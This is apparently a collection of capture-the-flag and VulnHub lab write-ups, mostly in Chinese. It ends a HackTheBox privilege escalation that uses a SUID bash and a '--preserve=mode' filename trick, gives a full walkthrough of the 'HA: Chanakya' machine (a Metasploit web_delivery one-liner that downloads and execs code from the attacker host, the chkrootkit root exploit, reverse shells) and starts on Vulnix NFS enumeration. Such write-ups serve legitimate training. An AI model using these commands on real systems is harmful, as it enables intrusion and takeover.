# Create config file that includes all files from named.bindmgr.
echo "[+] Creating $BINDMGR_CONF file."
printf '// Automatically generated file. Do not modify manually.\n' > $BINDMGR_CONF 
for file in * ; do
	printf 'include "/etc/bind/named.bindmgr/%s";\n' "$file" >> $BINDMGR_CONF
done

# Stage new version of configuration files.
echo "[+] Staging files to $BINDMGR_DIR." 
cp .version * /etc/bind/named.bindmgr/

# Check generated configuration with named-checkconf.
echo "[+] Checking staged configuration." 
named-checkconf $BINDMGR_CONF >/dev/null
if [[ $? -ne 0 ]] ; then
	echo "[-] ERROR: The generated configuration is not valid. Please fix following errors: "
	named-checkconf $BINDMGR_CONF 2>&1 | indent
	exit 44
else 
	echo "[+] Configuration successfully staged."
	# *** TODO *** Uncomment restart once we are live.
	# systemctl restart bind9
	if [[ $? -ne 0 ]] ; then
		echo "[-] Restart of bind9 via systemctl failed. Please check logfile: "
		systemctl status bind9
	else
		echo "[+] Restart of bind9 via systemctl succeeded."
	fi
fi
```

Looking at the script we can see that we need a .version file in the current directory with a version number so let's create it.

```bash
bindmgr@dynstr:/dev/shm$ echo "2" > .version
```

we can see from the script that we can get the privilege on the binary in the same directory so let's get /bin/bash to this directory.

```bash
bindmgr@dynstr:/dev/shm$ cp /bin/bash .
```

Now let's give it a suid bit and preserve that mode on that binary so now when we will execute the script we will get root privileged binary in /etc/bind/named.bindmgr/

```bash
bindmgr@dynstr:/dev/shm$ chmod +s bash
bindmgr@dynstr:/dev/shm$ echo > --preserve=mode
bindmgr@dynstr:/dev/shm$ ls -la
total 1164
drwxrwxrwt  2 root    root        100 Jun 14 08:41  .
drwxr-xr-x 17 root    root       3940 Jun 12 21:02  ..
-rwsr-sr-x  1 bindmgr bindmgr 1183448 Jun 14 08:40  bash
-rw-rw-r--  1 bindmgr bindmgr       1 Jun 14 08:41 '--preserve=mode'
-rw-rw-r--  1 bindmgr bindmgr       2 Jun 14 08:40  .version
```

Now let's execute the sudo command and get the root privileges on our bash binary.

```bash
bindmgr@dynstr:/dev/shm$ sudo /usr/local/bin/bindmgr.sh 
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /dev/shm.
[+] Creating /etc/bind/named.conf.bindmgr file.
[+] Staging files to /etc/bind/named.bindmgr.
[+] Checking staged configuration.
[-] ERROR: The generated configuration is not valid. Please fix following errors: 
    /etc/bind/named.bindmgr/bash:1: unknown option 'ELF...'
    /etc/bind/named.bindmgr/bash:14: unknown option 'hȀE'
    /etc/bind/named.bindmgr/bash:40: unknown option 'YF'
    /etc/bind/named.bindmgr/bash:40: unexpected token near '}'
bindmgr@dynstr:/dev/shm$ ls
 bash  '--preserve=mode'
bindmgr@dynstr:/dev/shm$ ls -al
total 1164
drwxrwxrwt  2 root    root        100 Jun 13 19:22  .
drwxr-xr-x 17 root    root       3960 Jun 13 15:38  ..
-rwsr-sr-x  1 bindmgr bindmgr 1183448 Jun 13 19:20  bash
-rw-rw-r--  1 bindmgr bindmgr       1 Jun 13 19:22 '--preserve=mode'
-rw-rw-r--  1 bindmgr bindmgr       2 Jun 13 19:17  .version
```

Now let's run the bash as the privileged as root.

```bash
bindmgr@dynstr:/dev/shm$ /etc/bind/named.bindmgr/bash -p 
bash-5.0# id
uid=1001(bindmgr) gid=1001(bindmgr) euid=0(root) egid=117(bind) groups=117(bind),1001(bindmgr)
bash-5.0# cat /etc/shadow | grep root
root:$6$knCJjR0E8SuLyI5.$r7dGtVVY/Z6X0RQKxUvBZY4BQ3DwL7kHtu5YO9cclorPryKq489j2JqN262Ows/aRZvFkQ1R9uQyqoVWeS8ED1:18705:0:99999:7:::
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2005.jpg)

Now we are root let's get all the flags.

#### Summary of knowledge

 - DNS Enumeration to find some subdomains
 - Directory Fuzzing using ffuf
 - use HTTPBasicAuth get a rev shell
 - add PTR record pointing to our IP to ssh into the shell
 - privesc through /usr/bin/local/bindmgr.sh script

#### Contact me

 - QQ: 1185151867
 - twitter: https://twitter.com/fdlucifer11
 - github: https://github.com/FDlucifer

<font color="blue">I'm lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more...</font>
<!-- kb:end dynstr -->

</details>

<a id="case-ha-chanakya"></a>

## FTP 流量与授权密钥

PCAP 中的 FTP 凭据连接可写目录，授权密钥带来 SSH 登录；chkrootkit 任务成为本地提权点。文件落点与任务时序可在记录中核查。

<p class="kb-provenance">来源 HA-Chanakya · 原记录 2019-12-16 · 12 个代码块 · 2 处图片引用</p>

<details class="kb-evidence" id="record-ha-chanakya">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start HA-Chanakya -->

名称：HA: Chanakya
发布日期：2019年11月9日

下载：

 - Download: [https://drive.google.com/file/d/19IyCAe91_EeELwjTFqoZ4_fwHKURNBD4/view?usp=sharing](https://drive.google.com/file/d/19IyCAe91_EeELwjTFqoZ4_fwHKURNBD4/view?usp=sharing)
 - Download (Mirror): [https://download.vulnhub.com/ha/chanakya.zip](https://download.vulnhub.com/ha/chanakya.zip)
 - Download (Torrent): [https://download.vulnhub.com/ha/chanakya.zip.torrent](https://download.vulnhub.com/ha/chanakya.zip.torrent)

描述：

摧毁王国的策划者又回来了，这次他创造了一个难题，会让你挠头！ 是时候面对Chanakya。
您能否解决这个“从根本上启动”并证明自己比较明智？
枚举是关键！！！！

级别：中级

任务：枚举目标计算机并获得root用户访问权限。



#### 信息收集

老规矩上nmap

``` bash
root@kali:~# nmap -sn -v 192.168.142.0/24
Nmap scan report for 192.168.142.130
Host is up (0.00034s latency).
MAC Address: 00:0C:29:BB:CA:D3 (VMware)
```

``` bash
root@kali:~# nmap -A -sV -Pn -T4 -v --script=vuln 192.168.142.130
PORT   STATE SERVICE VERSION
21/tcp open  ftp     pyftpdlib 1.0.0 or later
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
| http-internal-ip-disclosure: 
|_  Internal IP Leaked: 127.0.1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:apache:http_server:2.4.29: 
|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333
|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763
|_      CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
```

dirb目录扫一波

``` bash
root@kali:~# dirb http://192.168.142.130/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Dec 15 22:27:13 2019
URL_BASE: http://192.168.142.130/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.142.130/ ----
==> DIRECTORY: http://192.168.142.130/assets/                                                         
==> DIRECTORY: http://192.168.142.130/images/                                                         
+ http://192.168.142.130/index.html (CODE:200|SIZE:2382)                                              
+ http://192.168.142.130/server-status (CODE:403|SIZE:280)

root@kali:~# dirb http://192.168.142.130/ -X .txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Dec 15 22:28:34 2019
URL_BASE: http://192.168.142.130/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.txt) | (.txt) [NUM = 1]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.142.130/ ----
+ http://192.168.142.130/abuse.txt (CODE:200|SIZE:14)
```

访问该txt文件发现如下内容

``` bash
nfubxn.cpncat
```

使用[rot13.com](https://rot13.com/)进行rot13解密，解密出来是ashoka.pcapng，然后访问(http://192.168.142.130/ashoka.pcapng),将此文件下载，然后wireshark打开该文件。

在Wireshark中打开捕获的文件，然后跟随ftp流量的tcp流，并获得ftp的用户名ashoka和密码kautilya。

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub63.jpg)

``` bash
220 pyftpdlib based ftpd ready.
USER ashoka
331 Username ok, send password.
PASS kautilya
230 Login successful.
SYST
215 UNIX Type: L8
FEAT
211-Features supported:
 EPRT
 EPSV
 MDTM
 MLST type*;perm*;size*;modify*;unique*;unix.mode;unix.uid;unix.gid;
 REST STREAM
 SIZE
 TVFS
 UTF8
211 End FEAT.
OPTS UTF8 ON
501 Invalid argument.
PWD
257 "/" is the current directory.
TYPE A
200 Type set to: ASCII.
PASV
227 Entering passive mode (192,168,1,101,177,201).
MLSD
150 File status okay. About to open data connection.
226 Transfer complete.
```

现在有了FTP登录凭据，登录到FTP服务器。 登录后，运行ls命令环顾四周。 发现在根目录中。 因此，决定通过将SSH放置在此位置来完成ssh的操作。 为此，创建一个名为“ .ssh”的目录。 遍历这个新创建的目录后，回到本机终端。

``` bash
root@kali:~# ftp 192.168.142.130
Connected to 192.168.142.130.
220 pyftpdlib based ftpd ready.
Name (192.168.142.130:root): ashoka
331 Username ok, send password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 Active data connection established.
125 Data connection already open. Transfer starting.
-rw-------   1 ashoka   ashoka          1 Nov 05 15:57 .bash_history
-rw-r--r--   1 ashoka   ashoka        220 Nov 05 14:05 .bash_logout
-rw-r--r--   1 ashoka   ashoka       3771 Nov 05 14:05 .bashrc
drwx------   2 ashoka   ashoka       4096 Nov 05 14:18 .cache
drwxrwxr-x   3 ashoka   ashoka       4096 Nov 05 14:26 .local
-rw-r--r--   1 ashoka   ashoka        807 Nov 05 14:05 .profile
226 Transfer complete.
ftp> mkdir .ssh
257 "/.ssh" directory created.
ftp> cd .ssh
250 "/.ssh" is the current directory.
```

现在该生成一些ssh密钥了。 使用ssh-keygen创建了一些密钥。 输入的密码为“ 123”。 这可以是您选择的任何东西。 将其保留下来以便于记忆。 在创建密钥之后继续前进，进入了本机shell程序的.ssh目录。 在这里，看到了名为“ id_rsa.pub”的密钥。 现在需要将此密钥上传到FTP，因此将is_rsa.pub的内容复制到名为authorized_keys的文件中。

``` bash
root@kali:~/.ssh# ls
id_rsa  id_rsa.pub  known_hosts
root@kali:~/.ssh# cat id_rsa.pub > authorized_keys
root@kali:~/.ssh# ls
authorized_keys  id_rsa  id_rsa.pub  known_hosts
root@kali:~/.ssh# cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTIuh8j20bp4uFWWmOn9IXRvRYDVvBjARjPeCZ7o00nnwTzJ/Y1OBU1AoDVNIq6aM/CVJ9qCy0zceqNfC1roGUM+cvUVO+qR5aG+QnT8mxdRnoXin+JAk8nFuynJ63016zuauB0iQUwyQ9dRm+jzW9+J/9S86Fd/qcbKNYbW5wn9Chh3T+bj+T+6RCKlU7q6q+Kc1S4WfI7iXJ6doR9hxD91CRUVWG/KyADbZuWsTuDyxxrQ/KA8ek05owsokgIc9rS8ZjtB23rR1yai/B3hfjjQgKMQkF6k9D7J6Qm07VgDZkYm4RTxlO8bDDnfkNOBs9rzBomPrN2rOeounir4ZIj+dDDpH9tGklDLyCW6RKx8fiN/s9z5Knf61a+9nielEO8DUqaEt+bHTl/3uVimZ01upoLEamclLadpMSBfT6CccUnD2bu4Kcb9kcOjHTW4pQEL9BXSu+upvQDJyRsPxy1JLNZ5xdkJoQKyt5OArNjUq7SsVAOZzNQRaM3JGit9s= root@kali
root@kali:~/.ssh# cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTIuh8j20bp4uFWWmOn9IXRvRYDVvBjARjPeCZ7o00nnwTzJ/Y1OBU1AoDVNIq6aM/CVJ9qCy0zceqNfC1roGUM+cvUVO+qR5aG+QnT8mxdRnoXin+JAk8nFuynJ63016zuauB0iQUwyQ9dRm+jzW9+J/9S86Fd/qcbKNYbW5wn9Chh3T+bj+T+6RCKlU7q6q+Kc1S4WfI7iXJ6doR9hxD91CRUVWG/KyADbZuWsTuDyxxrQ/KA8ek05owsokgIc9rS8ZjtB23rR1yai/B3hfjjQgKMQkF6k9D7J6Qm07VgDZkYm4RTxlO8bDDnfkNOBs9rzBomPrN2rOeounir4ZIj+dDDpH9tGklDLyCW6RKx8fiN/s9z5Knf61a+9nielEO8DUqaEt+bHTl/3uVimZ01upoLEamclLadpMSBfT6CccUnD2bu4Kcb9kcOjHTW4pQEL9BXSu+upvQDJyRsPxy1JLNZ5xdkJoQKyt5OArNjUq7SsVAOZzNQRaM3JGit9s= root@kali
root@kali:~/.ssh# ls
authorized_keys  id_rsa  id_rsa.pub  known_hosts
```
使用put命令将文件传输到目标计算机

``` bash
ftp> put authorized_keys 
local: authorized_keys remote: authorized_keys
200 Active data connection established.
125 Data connection already open. Transfer starting.
226 Transfer complete.
563 bytes sent in 0.00 secs (14.5113 MB/s)
ftp> ls
200 Active data connection established.
125 Data connection already open. Transfer starting.
-rw-r--r--   1 root     root          563 Dec 16 05:30 authorized_keys
226 Transfer complete.
```

现在，使用ssh连接到目标计算机。 由于之前放置了授权密钥，因此现在可以登录。 得到了Ashoka用户的shell。 经过一些枚举，看到临时文件中有一个日志文件。 尝试使用cat命令。 看起来像Chkrootkit测试结果日志。 这提示也许可以使用Chkrootkit在此计算机上升级特权。

``` bash
root@kali:~# ssh ashoka@192.168.142.130
The authenticity of host '192.168.142.130 (192.168.142.130)' can't be established.
ECDSA key fingerprint is SHA256:cuEf1JsbferQL5tQ/iVC9mGMCIALDE5/sX/OJt5LgPQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.142.130' (ECDSA) to the list of known hosts.
Enter passphrase for key '/root/.ssh/id_rsa': 
Enter passphrase for key '/root/.ssh/id_rsa': 
Enter passphrase for key '/root/.ssh/id_rsa': 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Tue Nov  5 06:36:00 2019 from 192.168.1.107
ashoka@ubuntu:~$ id
uid=1001(ashoka) gid=1001(ashoka) groups=1001(ashoka)
ashoka@ubuntu:~$ whoami
ashoka
ashoka@ubuntu:~$ cat /tmp/logs
ROOTDIR is `/'
Checking `amd'... not found
Checking `basename'... not infected
Checking `biff'... not found
Checking `chfn'... not infected
Checking `chsh'... not infected
Checking `cron'... not infected
Checking `crontab'... not infected
Checking `date'... not infected
Checking `du'... not infected
Checking `dirname'... not infected
Checking `echo'... not infected
Checking `egrep'... not infected
Checking `env'... not infected
Checking `find'... not infected
Checking `fingerd'... not found
Checking `gpm'... not found
Checking `grep'... not infected
Checking `hdparm'... not infected
Checking `su'... not infected
Checking `ifconfig'... not infected
Checking `inetd'... not tested
Checking `inetdconf'... not found
Checking `identd'... not found
Checking `init'... not infected
Checking `killall'... not infected
Checking `ldsopreload'... can't exec ./strings-static, not tested
Checking `login'... not infected
Checking `ls'... not infected
Checking `lsof'... not infected
Checking `mail'... not found
Checking `mingetty'... not found
Checking `netstat'... not infected
Checking `named'... not found
Checking `passwd'... not infected
Checking `pidof'... not infected
Checking `pop2'... not found
Checking `pop3'... not found
Checking `ps'... not infected
Checking `pstree'... not infected
Checking `rpcinfo'... not found
Checking `rlogind'... not found
Checking `rshd'... not found
Checking `slogin'... not infected
Checking `sendmail'... not found
Checking `sshd'... not infected
Checking `syslogd'... not tested
Checking `tar'... not infected
Checking `tcpd'... INFECTED
Checking `tcpdump'... not infected
Checking `top'... not infected
Checking `telnetd'... not found
Checking `timed'... not found
Checking `traceroute'... not found
Checking `vdir'... not infected
Checking `w'... not infected
Checking `write'... not infected
Checking `aliens'... no suspect files
Searching for sniffer's logs, it may take a while... nothing found
Searching for HiDrootkit's default dir... nothing found
Searching for t0rn's default files and dirs... nothing found
Searching for t0rn's v8 defaults... nothing found
Searching for Lion Worm default files and dirs... nothing found
Searching for RSHA's default files and dir... nothing found
Searching for RH-Sharpe's default files... nothing found
Searching for Ambient's rootkit (ark) default files and dirs... nothing found
Searching for suspicious files and dirs, it may take a while... 
/lib/modules/4.15.0-20-generic/vdso/.build-id
/lib/modules/4.15.0-20-generic/vdso/.build-id
Searching for LPD Worm files and dirs... nothing found
Searching for Ramen Worm files and dirs... nothing found
Searching for Maniac files and dirs... nothing found
Searching for RK17 files and dirs... nothing found
Searching for Ducoci rootkit... nothing found
Searching for Adore Worm... nothing found
Searching for ShitC Worm... nothing found
Searching for Omega Worm... nothing found
Searching for Sadmind/IIS Worm... nothing found
Searching for MonKit... nothing found
Searching for Showtee... nothing found
Searching for OpticKit... nothing found
Searching for T.R.K... nothing found
Searching for Mithra... nothing found
Searching for LOC rootkit... nothing found
Searching for Romanian rootkit... nothing found
Searching for Suckit rootkit... Warning: /sbin/init INFECTED
Searching for Volc rootkit... nothing found
Searching for Gold2 rootkit... nothing found
Searching for TC2 Worm default files and dirs... nothing found
Searching for Anonoying rootkit default files and dirs... nothing found
Searching for ZK rootkit default files and dirs... nothing found
Searching for ShKit rootkit default files and dirs... nothing found
Searching for AjaKit rootkit default files and dirs... nothing found
Searching for zaRwT rootkit default files and dirs... nothing found
Searching for Madalin rootkit default files... nothing found
Searching for Fu rootkit default files... nothing found
Searching for ESRK rootkit default files... nothing found
Searching for rootedoor... nothing found
Searching for ENYELKM rootkit default files... nothing found
Searching for common ssh-scanners default files... nothing found
Searching for suspect PHP files... nothing found
Searching for anomalies in shell history files... nothing found
Checking `asp'... not infected
Checking `bindshell'... not infected
Checking `lkm'... not tested: can't exec 
Checking `rexedcs'... not found
Checking `sniffer'... not tested: can't exec ./ifpromisc
Checking `w55808'... not infected
Checking `wted'... not tested: can't exec ./chkwtmp
Checking `scalper'... not infected
Checking `slapper'... not infected
Checking `z2'... not tested: can't exec ./chklastlog
Checking `chkutmp'... not tested: can't exec ./chkutmp
Checking `OSX_RSPLUG'... not infected
```

#### 提权

现在，要在目标计算机上升级特权，将需要在目标计算机上配备一个meterpreter，并在Metasploit的帮助下使用get root。 使用web_delivery漏洞利用meterpreter。 在use命令的帮助下选择了web_delivery利用，然后提供了lhost。 Lhost是目标计算机（Kali Linux）的IP地址。 将输入漏洞利用代码。 这将创建一个单行脚本，该脚本将使我们对目标计算机有一个meterpreter。

``` bash
root@kali:~# msfdb run
[+] Starting database
                                                  
# cowsay++
 ____________                                                                                          
< metasploit >                                                                                         
 ------------                                                                                          
       \   ,__,                                                                                        
        \  (oo)____                                                                                    
           (__)    )\                                                                                  
              ||--|| *                                                                                 
                                                                                                       

       =[ metasploit v5.0.63-dev                          ]
+ -- --=[ 1951 exploits - 1091 auxiliary - 334 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > use exploit/multi/script/web_delivery
msf5 exploit(multi/script/web_delivery) > set LHOST 192.168.142.128
LHOST => 192.168.142.128
msf5 exploit(multi/script/web_delivery) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.142.128:4444 
msf5 exploit(multi/script/web_delivery) > [*] Using URL: http://0.0.0.0:8080/iG1jsBgk9ZBOAY
[*] Local IP: http://192.168.142.128:8080/iG1jsBgk9ZBOAY
[*] Server started.
[*] Run the following command on the target machine:
python -c "import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://192.168.142.128:8080/iG1jsBgk9ZBOAY');exec(r.read());"
```

复制漏洞利用程序生成的命令，并在之前获得的ssh会话运行python -c "import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://192.168.142.128:8080/iG1jsBgk9ZBOAY');exec(r.read());"。

``` bash
ashoka@ubuntu:~$ python -c "import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://192.168.142.128:8080/iG1jsBgk9ZBOAY');exec(r.read());"
```

这给了需要的session。将使用Metasploit中的内置漏洞利用程序，可以帮助我们在目标计算机上获得root shell。 我们选择了会话并为另一个会话提供了端口。 键入漏洞利用程序后，发现漏洞利用程序正在运行，并且通过前面提到的端口为我们提供了另一个shell为了将shell转换为能够用的shell，运行了python单行代码以生成TTY shell。

``` bash
msf5 exploit(multi/script/web_delivery) > 
[*] 192.168.142.130  web_delivery - Delivering Payload (454) bytes
[*] Sending stage (53755 bytes) to 192.168.142.130
[*] Meterpreter session 3 opened (192.168.142.128:4444 -> 192.168.142.130:38970) at 2019-12-16 01:06:52 -0500

msf5 exploit(multi/script/web_delivery) > 
msf5 exploit(multi/script/web_delivery) > use exploit/unix/local/chkrootkit
msf5 exploit(unix/local/chkrootkit) > set session 3
session => 3
msf5 exploit(unix/local/chkrootkit) > set lport 8888
lport => 8888
msf5 exploit(unix/local/chkrootkit) > exploit

[*] Started reverse TCP double handler on 192.168.142.128:8888 
[!] Rooting depends on the crontab (this could take a while)
[*] Payload written to /tmp/update
[*] Waiting for chkrootkit to run via cron...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo XMnVavzOqVIfxgY5;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "XMnVavzOqVIfxgY5\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 4 opened (192.168.142.128:8888 -> 192.168.142.130:44238) at 2019-12-16 01:09:28 -0500
whoami
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo BGwiPjx0EW1uplK3;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "BGwiPjx0EW1uplK3\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 5 opened (192.168.142.128:8888 -> 192.168.142.130:44242) at 2019-12-16 01:10:28 -0500
[!] Tried to delete /tmp/update, unknown result
root
python -c 'import pty; pty.spawn("/bin/sh")'
# whoami
whoami
root
# ls
ls
final.txt
# cat final.txt
cat final.txt
                                                                   
!! Congrats you have finished this task !!

Contact us here:

Hacking Articles : https://twitter.com/rajchandel/
Geet Madan : https://in.linkedin.com/in/geet-madan

+-+-+-+-+-+ +-+-+-+-+-+-+-+
 |E|n|j|o|y| |H|A|C|K|I|N|G|
 +-+-+-+-+-+ +-+-+-+-+-+-+-+
____________________________________
#
```

找到一个文本文件final.txt，将其打开以查找final flag,挑战到此结束,6的一批。

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="red">***The end,to be continue...***</font>
<!-- kb:end HA-Chanakya -->

</details>

<a id="case-hacklab-vulnix"></a>

## NFS UID 映射与 root_squash

finger、RPC 和 NFS 枚举连接到导出目录的身份映射。复现依赖客户端 UID、root_squash 与 no_root_squash 的实际状态。

<p class="kb-provenance">来源 HackLAB-Vulnix · 原记录 2020-04-15 · 22 个代码块 · 2 处图片引用</p>

<details class="kb-evidence" id="record-hacklab-vulnix">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start HackLAB-Vulnix -->

#### 名称
名称：HackLAB: Vulnix
发布日期：2012年9月10日

#### 下载

Vulnix.7z

 - Download: http://www.rebootuser.com/wp-content/uploads/vulnix/Vulnix.7z
 - Download (Mirror): https://download.vulnhub.com/hacklab/Vulnix.7z
 - Download (Torrent): https://download.vulnhub.com/hacklab/Vulnix.7z.torrent



#### 描述

在这里，有一台易受攻击的Linux主机，它具有配置方面的缺陷，而不是有目的的易受攻击的软件版本（无论如何，在发布之时！）该主机基于Ubuntu Server 12.04，并于2012年9月上旬进行了全面修补。详细信息如下：

架构：x86
格式：VMware（vmx＆vmdk）从版本4开始兼容
内存：512MB
网络：NAT
提取大小：820MB
压缩（下载大小）：194MB – 7zip格式– 7zip可从此处获得
MD5 Vulnix哈希值7z：0bf19d11836f72d22f30bf52cd585757
从此处下载Vulnix-

目标;引导，查找IP，破解并获得隐藏在/root中的flag-通过任何想要的方式-不包括对vmdk的实际破解如果有任何问题/意见，请使用下面的评论部分免费联系。

请享用！

资料来源：http://www.rebootuser.com/?p=933

#### 信息收集

上nmap

``` bash
root@kali:~# nmap -sn -v 192.168.66.*
Nmap scan report for 192.168.66.18
Host is up (0.00018s latency).
MAC Address: 00:0C:29:6C:D6:66 (VMware)
```

``` bash
root@kali:~# nmap -sV -v -p- 192.168.66.18
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
25/tcp    open  smtp       Postfix smtpd
79/tcp    open  finger     Linux fingerd
110/tcp   open  pop3?
111/tcp   open  rpcbind    2-4 (RPC #100000)
143/tcp   open  imap       Dovecot imapd
512/tcp   open  exec       netkit-rsh rexecd
513/tcp   open  login?
514/tcp   open  tcpwrapped
993/tcp   open  ssl/imaps?
995/tcp   open  ssl/pop3s?
2049/tcp  open  nfs_acl    2-3 (RPC #100227)
39832/tcp open  mountd     1-3 (RPC #100005)
42471/tcp open  status     1 (RPC #100024)
45506/tcp open  nlockmgr   1-4 (RPC #100021)
52840/tcp open  mountd     1-3 (RPC #100005)
53613/tcp open  mountd     1-3 (RPC #100005)
```

如所见，对于某些用户枚举来说，有一些开放的端口可能很有趣：25（smtp），79（finger）和111（rpcbind）。开始做一些手动尝试来获取端口25（smtp）上的用户：

``` bash
root@kali:~# telnet 192.168.66.18 25
Trying 192.168.66.18...
Connected to 192.168.66.18.
Escape character is '^]'.
220 vulnix ESMTP Postfix (Ubuntu)
ehlo server
250-vulnix
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN
vrfy root
252 2.0.0 root
vrfy admin
550 5.1.1 <admin>: Recipient address rejected: User unknown in local recipient table
vrfy user
252 2.0.0 user
vrfy administrator
550 5.1.1 <administrator>: Recipient address rejected: User unknown in local recipient table
vrfy vulnix
252 2.0.0 vulnix
```

在系统上找到3个用户：root，user和vulnix。继续使用finger进行一些研究：

``` bash
root@kali:~# finger @192.168.66.18
No one logged on.
root@kali:~# finger root@192.168.66.18
Login: root                             Name: root
Directory: /root                        Shell: /bin/bash
Never logged in.
No mail.
No Plan.
root@kali:~# finger user@192.168.66.18
Login: user                             Name: user
Directory: /home/user                   Shell: /bin/bash
Never logged in.
No mail.
No Plan.

Login: dovenull                         Name: Dovecot login user
Directory: /nonexistent                 Shell: /bin/false
Never logged in.
No mail.
No Plan.
root@kali:~# finger vulnix@192.168.66.18
Login: vulnix                           Name: 
Directory: /home/vulnix                 Shell: /bin/bash
Never logged in.
No mail.
No Plan.
```

有趣的是，该用户用户还具有用于Dovecot的虚拟用户，但没有登录。Dovecot是一个开源电子邮件服务器。这可能是有用的信息。

服务rpcbind已打开。这对于执行一些RPC枚举很有用：

``` bash
root@kali:~# rpcinfo -p 192.168.66.18
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100024    1   udp  38458  status
    100024    1   tcp  39760  status
    100003    2   tcp   2049  nfs
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    2   tcp   2049
    100227    3   tcp   2049
    100003    2   udp   2049  nfs
    100003    3   udp   2049  nfs
    100003    4   udp   2049  nfs
    100227    2   udp   2049
    100227    3   udp   2049
    100021    1   udp  47060  nlockmgr
    100021    3   udp  47060  nlockmgr
    100021    4   udp  47060  nlockmgr
    100021    1   tcp  50245  nlockmgr
    100021    3   tcp  50245  nlockmgr
    100021    4   tcp  50245  nlockmgr
    100005    1   udp  47351  mountd
    100005    1   tcp  50825  mountd
    100005    2   udp  42195  mountd
    100005    2   tcp  55764  mountd
    100005    3   udp  38349  mountd
    100005    3   tcp  38329  mountd
```

现在确定NFS正在侦听端口2049/tcp和2049/udp。现在是时候进行一些NFS枚举了：

``` bash
root@kali:~# showmount -e 192.168.66.18
